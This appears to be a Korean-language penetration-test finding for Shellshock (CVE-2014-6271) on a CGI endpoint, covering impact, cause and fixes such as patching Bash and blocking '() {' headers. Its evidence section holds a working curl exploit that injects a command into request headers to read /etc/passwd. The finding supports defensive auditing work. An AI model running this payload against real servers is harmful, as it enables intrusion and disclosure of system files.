## ShellShock - Remote Code Execution
- **End-Point**: `http://10.67.139.88/cgi-bin/test.cgi`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 대상 시스템의 제어권을 획득하고 무단 액세스, 데이터 탈취 및 시스템 파괴를 수행할 수 있습니다.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수에 포함된 함수 정의 뒤의 문자열을 부적절하게 처리하여 발생하는 취약점(CVE-2014-6271)입니다. Apache HTTP 서버의 mod_cgi와 같이 외부 입력을 환경 변수로 전달하는 구조에서 공격자가 조작된 헤더를 통해 임의 명령어를 실행할 수 있습니다.
- **근거**: `Cookie`, `Referer`, `Shellshock` 헤더에 `() { ignored; };` 패턴과 함께 `/bin/cat /etc/passwd` 명령어를 삽입하여 전송함으로써 서버의 민감한 파일 내용이 노출됨을 확인하였습니다. 재현 코드: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' 'http://10.67.139.88/cgi-bin/test.cgi'`
- **대응**: 취약한 버전의 Bash를 최신 보안 패치가 적용된 버전으로 업데이트해야 하며, 외부 입력값이 환경 변수로 직접 전달되는 CGI 스크립트의 사용을 지양해야 합니다.
- **조치**: 시스템 패키지 관리 도구를 사용하여 Bash를 최신 버전으로 업데이트(`yum update bash` 또는 `apt-get install --only-upgrade bash`)하고, 웹 방화벽(WAF)에서 `() {`로 시작하는 비정상적인 헤더 패턴을 차단하도록 설정합니다.
